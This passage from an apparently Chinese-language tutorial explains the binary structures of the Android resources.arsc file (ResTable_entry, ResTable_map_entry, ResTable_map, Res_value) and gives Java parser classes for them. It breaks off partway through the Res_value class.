      <span style="color:#66d9ef">return</span> header<span style="color:#f92672">.</span><span style="color:#a6e22e">getHeaderSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> 1 <span style="color:#f92672">+</span> 1 <span style="color:#f92672">+</span> 2 <span style="color:#f92672">+</span> 4 <span style="color:#f92672">+</span> 4<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;header:&#34;</span><span style="color:#f92672">+</span>header<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,id:&#34;</span><span style="color:#f92672">+</span>id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,res0:&#34;</span><span style="color:#f92672">+</span>res0<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,res1:&#34;</span><span style="color:#f92672">+</span>res1<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,entryCount:&#34;</span><span style="color:#f92672">+</span>entryCount<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,entriesStart:&#34;</span><span style="color:#f92672">+</span>entriesStart<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p>ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTableEntry</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> FLAG_COMPLEX <span style="color:#f92672">=</span> 0x0001<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> FLAG_PUBLIC <span style="color:#f92672">=</span> 0x0002<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> size<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> flags<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> ResStringPoolRef key<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTableEntry</span><span style="color:#f92672">(){</span>
      key <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResStringPoolRef<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getSize</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> 2<span style="color:#f92672">+</span>2<span style="color:#f92672">+</span>key<span style="color:#f92672">.</span><span style="color:#a6e22e">getSize</span><span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;size:&#34;</span><span style="color:#f92672">+</span>size<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,flags:&#34;</span><span style="color:#f92672">+</span>flags<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,key:&#34;</span><span style="color:#f92672">+</span>key<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,str:&#34;</span><span style="color:#f92672">+</span>ParseResourceUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">getKeyString</span><span style="color:#f92672">(</span>key<span style="color:#f92672">.</span><span style="color:#a6e22e">index</span><span style="color:#f92672">);</span>
  <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p>ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTableMapEntry</span> <span style="color:#66d9ef">extends</span> ResTableEntry<span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> ResTableRef parent<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> count<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTableMapEntry</span><span style="color:#f92672">(){</span>
      parent <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResTableRef<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getSize</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> parent<span style="color:#f92672">.</span><span style="color:#a6e22e">getSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> 4<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;,parent:&#34;</span><span style="color:#f92672">+</span>parent<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,count:&#34;</span><span style="color:#f92672">+</span>count<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p>ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> com.wjdiankong.parseresource.type<span style="color:#f92672">;</span>
   
<span style="color:#75715e">/**
</span><span style="color:#75715e"> struct ResTable_map
</span><span style="color:#75715e"> {
</span><span style="color:#75715e">     //bag资源项ID
</span><span style="color:#75715e">     ResTable_ref name;
</span><span style="color:#75715e">     //bag资源项值
</span><span style="color:#75715e">     Res_value value;
</span><span style="color:#75715e"> };
</span><span style="color:#75715e"> * @author i
</span><span style="color:#75715e"> *
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTableMap</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> ResTableRef name<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> ResValue value<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTableMap</span><span style="color:#f92672">(){</span>
      name <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResTableRef<span style="color:#f92672">();</span>
      value <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResValue<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getSize</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> name<span style="color:#f92672">.</span><span style="color:#a6e22e">getSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> value<span style="color:#f92672">.</span><span style="color:#a6e22e">getSize</span><span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> name<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,value:&#34;</span><span style="color:#f92672">+</span>value<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p>如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResValue</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#75715e">//dataType字段使用的常量
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_NULL <span style="color:#f92672">=</span> 0x00<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_REFERENCE <span style="color:#f92672">=</span> 0x01<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_ATTRIBUTE <span style="color:#f92672">=</span> 0x02<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_STRING <span style="color:#f92672">=</span> 0x03<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_FLOAT <span style="color:#f92672">=</span> 0x04<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_DIMENSION <span style="color:#f92672">=</span> 0x05<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_FRACTION <span style="color:#f92672">=</span> 0x06<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_FIRST_INT <span style="color:#f92672">=</span> 0x10<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_DEC <span style="color:#f92672">=</span> 0x10<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_HEX <span style="color:#f92672">=</span> 0x11<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_BOOLEAN <span style="color:#f92672">=</span> 0x12<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_FIRST_COLOR_INT <span style="color:#f92672">=</span> 0x1c<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_COLOR_ARGB8 <span style="color:#f92672">=</span> 0x1c<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_COLOR_RGB8 <span style="color:#f92672">=</span> 0x1d<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_COLOR_ARGB4 <span style="color:#f92672">=</span> 0x1e<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_INT_COLOR_RGB4 <span style="color:#f92672">=</span> 0x1f<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_LAST_COLOR_INT <span style="color:#f92672">=</span> 0x1f<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> TYPE_LAST_INT <span style="color:#f92672">=</span> 0x1f<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span>
    COMPLEX_UNIT_PX			<span style="color:#f92672">=</span>0<span style="color:#f92672">,</span>
    COMPLEX_UNIT_DIP		<span style="color:#f92672">=</span>1<span style="color:#f92672">,</span>
    COMPLEX_UNIT_SP			<span style="color:#f92672">=</span>2<span style="color:#f92672">,</span>
    COMPLEX_UNIT_PT			<span style="color:#f92672">=</span>3<span style="color:#f92672">,</span>
    COMPLEX_UNIT_IN			<span style="color:#f92672">=</span>4<span style="color:#f92672">,</span>
    COMPLEX_UNIT_MM			<span style="color:#f92672">=</span>5<span style="color:#f92672">,</span>
  COMPLEX_UNIT_SHIFT		<span style="color:#f92672">=</span>0<span style="color:#f92672">,</span>
    COMPLEX_UNIT_MASK		<span style="color:#f92672">=</span>15<span style="color:#f92672">,</span>
    COMPLEX_UNIT_FRACTION	<span style="color:#f92672">=</span>0<span style="color:#f92672">,</span>
    COMPLEX_UNIT_FRACTION_PARENT<span style="color:#f92672">=</span>1<span style="color:#f92672">,</span>
    COMPLEX_RADIX_23p0		<span style="color:#f92672">=</span>0<span style="color:#f92672">,</span>
    COMPLEX_RADIX_16p7		<span style="color:#f92672">=</span>1<span style="color:#f92672">,</span>
    COMPLEX_RADIX_8p15		<span style="color:#f92672">=</span>2<span style="color:#f92672">,</span>
    COMPLEX_RADIX_0p23		<span style="color:#f92672">=</span>3<span style="color:#f92672">,</span>
    COMPLEX_RADIX_SHIFT		<span style="color:#f92672">=</span>4<span style="color:#f92672">,</span>
    COMPLEX_RADIX_MASK		<span style="color:#f92672">=</span>3<span style="color:#f92672">,</span>
    COMPLEX_MANTISSA_SHIFT	<span style="color:#f92672">=</span>8<span style="color:#f92672">,</span>
    COMPLEX_MANTISSA_MASK	<span style="color:#f92672">=</span>0xFFFFFF<span style="color:#f92672">;</span>
  	
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> size<span style="color:#f92672">;</span>  <span style="color:#75715e">//ResValue的头部大小
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span> res0<span style="color:#f92672">;</span>  <span style="color:#75715e">//保留，始终为0
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span> dataType<span style="color:#f92672">;</span>  <span style="color:#75715e">//数据的类型,可以从上面的枚举类型中获取
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> data<span style="color:#f92672">;</span>  <span style="color:#75715e">//数据对应的索引
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getSize</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> 2 <span style="color:#f92672">+</span> 1 <span style="color:#f92672">+</span> 1 <span style="color:#f92672">+</span> 4<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getTypeStr</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">switch</span><span style="color:#f92672">(</span>dataType<span style="color:#f92672">){</span>
          <span style="color:#66d9ef">case</span> TYPE_NULL<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_NULL&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_REFERENCE<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_REFERENCE&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_ATTRIBUTE<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_ATTRIBUTE&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_STRING<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_STRING&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_FLOAT<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_FLOAT&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_DIMENSION<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_DIMENSION&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_FRACTION<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_FRACTION&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_FIRST_INT<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_FIRST_INT&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_INT_HEX<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_INT_HEX&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_INT_BOOLEAN<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_INT_BOOLEAN&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_FIRST_COLOR_INT<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_FIRST_COLOR_INT&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_INT_COLOR_RGB8<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_INT_COLOR_RGB8&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_INT_COLOR_ARGB4<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_INT_COLOR_ARGB4&#34;</span><span style="color:#f92672">;</span>
          <span style="color:#66d9ef">case</span> TYPE_INT_COLOR_RGB4<span style="color:#f92672">:</span>
              <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;TYPE_INT_COLOR_RGB4&#34;</span><span style="color:#f92672">;</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#75715e">/*public String getDataStr(){
</span><span style="color:#75715e">      if(dataType == TYPE_STRING){
</span><span style="color:#75715e">          return ParseResourceUtils.getResString(data);
</span><span style="color:#75715e">      }else if(dataType == TYPE_FIRST_COLOR_INT){
</span><span style="color:#75715e">          return Utils.bytesToHexString(Utils.int2Byte(data));
</span><span style="color:#75715e">      }else if(dataType == TYPE_INT_BOOLEAN){
</span><span style="color:#75715e">          return data==0 ? &#34;false&#34; : &#34;true&#34;;
</span><span style="color:#75715e">      }
</span><span style="color:#75715e">      return data+&#34;&#34;;
</span><span style="color:#75715e">  }*/</span>
  	
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getDataStr</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_STRING<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> ParseResourceUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">getResString</span><span style="color:#f92672">(</span>data<span style="color:#f92672">);</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_ATTRIBUTE<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">format</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;?%s%08X&#34;</span><span style="color:#f92672">,</span>getPackage<span style="color:#f92672">(</span>data<span style="color:#f92672">),</span>data<span style="color:#f92672">);</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_REFERENCE<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">format</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;@%s%08X&#34;</span><span style="color:#f92672">,</span>getPackage<span style="color:#f92672">(</span>data<span style="color:#f92672">),</span>data<span style="color:#f92672">);</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_FLOAT<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">valueOf</span><span style="color:#f92672">(</span>Float<span style="color:#f92672">.</span><span style="color:#a6e22e">intBitsToFloat</span><span style="color:#f92672">(</span>data<span style="color:#f92672">));</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_INT_HEX<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">format</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;0x%08X&#34;</span><span style="color:#f92672">,</span>data<span style="color:#f92672">);</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_INT_BOOLEAN<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> data<span style="color:#f92672">!=</span>0<span style="color:#f92672">?</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">;</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_DIMENSION<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> Float<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>complexToFloat<span style="color:#f92672">(</span>data<span style="color:#f92672">))+</span>
              DIMENSION_UNITS<span style="color:#f92672">[</span>data <span style="color:#f92672">&amp;</span> COMPLEX_UNIT_MASK<span style="color:#f92672">];</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">==</span> TYPE_FRACTION<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> Float<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>complexToFloat<span style="color:#f92672">(</span>data<span style="color:#f92672">))+</span>
              FRACTION_UNITS<span style="color:#f92672">[</span>data <span style="color:#f92672">&amp;</span> COMPLEX_UNIT_MASK<span style="color:#f92672">];</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">&gt;=</span> TYPE_FIRST_COLOR_INT <span style="color:#f92672">&amp;&amp;</span> dataType <span style="color:#f92672">&lt;=</span> TYPE_LAST_COLOR_INT<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">format</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;#%08X&#34;</span><span style="color:#f92672">,</span>data<span style="color:#f92672">);</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>dataType <span style="color:#f92672">&gt;=</span> TYPE_FIRST_INT <span style="color:#f92672">&amp;&amp;</span> dataType <span style="color:#f92672">&lt;=</span> TYPE_LAST_INT<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">valueOf</span><span style="color:#f92672">(</span>data<span style="color:#f92672">);</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">return</span> String<span style="color:#f92672">.</span><span style="color:#a6e22e">format</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;0x%X, type 0x%02X&gt;&#34;</span><span style="color:#f92672">,</span>data<span style="color:#f92672">,</span> dataType<span style="color:#f92672">);</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getPackage</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> id<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>id<span style="color:#f92672">&gt;&gt;&gt;</span>24<span style="color:#f92672">==</span>1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
          <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;android:&#34;</span><span style="color:#f92672">;</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">float</span> <span style="color:#a6e22e">complexToFloat</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> complex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
      <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">float</span><span style="color:#f92672">)(</span>complex <span style="color:#f92672">&amp;</span> 0xFFFFFF00<span style="color:#f92672">)*</span>RADIX_MULTS<span style="color:#f92672">[(</span>complex<span style="color:#f92672">&gt;&gt;</span>4<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;</span> 3<span style="color:#f92672">];</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">float</span> RADIX_MULTS<span style="color:#f92672">[]={</span>
      0<span style="color:#f92672">.</span><span style="color:#a6e22e">00390625F</span><span style="color:#f92672">,</span>3<span style="color:#f92672">.</span><span style="color:#a6e22e">051758E</span><span style="color:#f92672">-</span>005F<span style="color:#f92672">,</span>1<span style="color:#f92672">.</span><span style="color:#a6e22e">192093E</span><span style="color:#f92672">-</span>007F<span style="color:#f92672">,</span>4<span style="color:#f92672">.</span><span style="color:#a6e22e">656613E</span><span style="color:#f92672">-</span>010F
  <span style="color:#f92672">};</span>
  	
  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String DIMENSION_UNITS<span style="color:#f92672">[]={</span>
      <span style="color:#e6db74">&#34;px&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;dip&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;sp&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;pt&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;mm&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span>
  <span style="color:#f92672">};</span>
  	
  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String FRACTION_UNITS<span style="color:#f92672">[]={</span>
